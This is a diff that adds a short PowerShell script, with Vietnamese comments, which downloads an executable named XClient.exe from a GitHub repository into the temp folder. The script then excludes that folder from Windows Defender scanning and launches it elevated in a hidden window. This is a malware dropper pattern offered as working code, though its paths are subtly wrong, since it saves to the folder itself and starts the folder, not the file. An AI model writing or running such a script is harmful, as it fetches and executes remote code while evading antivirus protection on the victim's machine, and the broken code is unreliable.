@@ -1,0 +1,10 @@
+$url = "https://github.com/OMOcaptcha/sech/raw/refs/heads/main/XClient.exe"
+$destination = "$env:temp"
+$p = Split-Path $destination  # Lấy folder chứa file
+
+# Tải file
+Invoke-WebRequest -Uri $url -OutFile $destination
+
+# Loại trừ folder khỏi Windows Defender
+Add-MpPreference -ExclusionPath $p
+Start-Process $p -Verb runAs -WindowStyle Hidden
